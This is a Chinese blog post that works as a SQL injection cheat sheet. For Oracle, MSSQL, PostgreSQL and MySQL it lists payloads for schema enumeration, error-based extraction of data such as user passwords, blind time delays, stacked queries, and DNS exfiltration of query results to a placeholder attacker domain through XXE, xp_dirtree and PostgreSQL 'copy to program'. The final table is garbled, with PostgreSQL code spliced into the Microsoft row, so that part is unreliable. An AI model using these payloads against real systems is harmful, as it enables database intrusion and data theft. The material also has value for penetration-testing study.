---
title: sql备忘表
categories: database
img: /images/mysql技巧.jpg
tags:
  - SQL
  - oracle
  - Microsoft
  - pgsql
  - mysql
abbrlink: 17654
date: 2024-09-14 17:47:27
---

## 字符串连接

将多个字符串连接在一起以形成单个字符串。

| Oracle     | 'foo'\|\|'bar'                                               |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | 'foo'+'bar'                                                  |
| PostgreSQL | 'foo'\|\|'bar'                                               |
| MySQL      | 'foo' 'bar' [Note the space between the two strings] <br />CONCAT('foo','bar') |

## Substring

您可以从具有指定长度的指定偏移量中提取字符串的一部分。请注意，偏移量索引从 1 开始。以下每个表达式都将返回字符串

| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| ---------- | --------------------------- |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |

## 评论

您可以使用注释来截断查询并删除原始查询中输入后的部分。

| Oracle     | `--comment`                                                  |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | --comment<br /> `/*comment*/`                                |
| PostgreSQL | `--comment`<br />`/*comment*/`                               |
| MySQL      | `#comment`<br /> `-- comment` [Note the space after the double dash]<br /> `/*comment*/` |

## 数据库版本

可以查询数据库以确定其类型和版本。

| Oracle     | `SELECT banner FROM v$version`<br />`SELECT version FROM v$instance` |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `SELECT @@version`                                           |
| PostgreSQL | `SELECT version()`                                           |
| MySQL      | `SELECT @@version`                                           |

## 数据库内容

您可以列出数据库中存在的表，以及这些表包含的列。

| Oracle     | `SELECT * FROM all_tables`<br />`SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `SELECT * FROM information_schema.tables`<br />`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | `SELECT * FROM information_schema.tables`<br />`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL      | `SELECT * FROM information_schema.tables`<br />`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

## 条件错误

可以测试单个布尔条件，如果条件为 true，则触发数据库错误

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

## 通过可见错误消息提取数据

可能会引出错误消息，从而泄露恶意查询返回的敏感数据

| Microsoft  | `SELECT 'foo' WHERE 1 = (SELECT 'secret')`<br />`> Conversion failed when converting the varchar value 'secret' to data type int.` |
| ---------- | ------------------------------------------------------------ |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`<br />`> invalid input syntax for integer: "secret"` |
| MySQL      | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))`<br />`> XPATH syntax error: '\secret'` |

## 批处理（或堆叠）查询

可以使用批处理查询连续执行多个查询。请注意，在执行后续查询时，结果不会返回给应用程序。因此，该技术主要用于盲目漏洞，在盲目漏洞中，您可以使用第二个查询来触发 DNS 查找、条件错误或时间延迟。

| Oracle     | `Does not support batched queries.`                          |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `QUERY-1-HERE; QUERY-2-HERE`<br />`QUERY-1-HERE QUERY-2-HERE` |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE`                                 |
| MySQL      | `QUERY-1-HERE; QUERY-2-HERE`                                 |

**注意**

使用 MySQL 时，批量查询通常不能用于 SQL 注入。但是，如果目标应用程序使用某些 PHP 或 Python API 与 MySQL 数据库通信，则偶尔会出现这种情况。

## 时间延迟

在处理查询时，可能会导致数据库出现时间延迟。以下将导致 10 秒的无条件时间延迟。

| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| ---------- | ------------------------------------- |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10)`                    |

## 有条件的时间延迟

测试单个布尔条件，并在条件为 true 时触发时间延迟。

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`            |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`               |

## DNS 查找

您可以使数据库对外部域执行 DNS 查找。为此，您需要使用DNSlog平台生成一个临时子域，您将在攻击中使用该子域，然后轮询 服务器以确认发生了 DNS 查找。

| Oracle     | (XXE) 的触发 DNS 查找的漏洞。漏洞已修补，但存在许多未修补的 Oracle 安装<br />SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') <br />适用于完全修补的 Oracle 安装，但需要提升的权限：<br />SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`  |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` |
| MySQL      | 仅适用于 Windows：<br />`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')` `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` |

## 使用数据泄露进行 DNS 查找

您可以使数据库对包含注入查询结果的外部域执行 DNS 查找。为此，DNSlog平台生成一个临时子域，您将在攻击中使用该子域，然后轮询服务器以检索任何 DNS 交互的详细信息，包括泄露的数据。

| Oracle     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`<br />`create OR replace function f() returns void as $$`|<br />`declare c text;`<br />`declare p text;`<br />begin |
| PostgreSQL | `SELECT into p (SELECT YOUR-QUERY-HERE);`<br />`c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';`<br />`execute c;`<br />`END;`<br />`$$ language plpgsql security definer;`<br />`SELECT f();` |
| MySQL      | 仅适用于 Windows：<br /> `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` |

